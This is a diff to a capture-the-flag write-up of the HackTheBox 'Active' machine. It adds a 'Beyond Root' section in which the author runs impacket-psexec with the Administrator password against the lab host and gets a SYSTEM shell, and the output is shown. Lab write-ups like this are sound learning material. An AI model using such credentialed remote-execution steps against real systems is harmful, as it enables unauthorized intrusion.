@@ -7,6 +7,8 @@ Level: Easy
 	3.1  Failed Attempt of ASREPROAST Kerberos Attack
 	3.2  Failed Attempt of OverPass The Hash Attack
 	3.2  Kerberoasting Attack
+4.  Beyond Root
+	4.1  `impacket-psexec` to simply login as Admin
 
 ### Initial Nmap Enum
 
@@ -313,3 +315,28 @@ more root.txt
 
 Got the Root Flag!!
 
+### Beyond Root
+
+Usually I exhaust by the time I get the root flag. But this time I wanted to have `NT AUTHORITY/SYSTEM` shell on the box. I achieved it using `impacket-psexec` as follow.
+
+```
+┌──(ringbuffer㉿kali)-[~/Downloads/Active.htb]
+└─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file cmdrCeEj.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service bDEe on 10.10.10.100.....
+[*] Starting service bDEe.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
+
+```
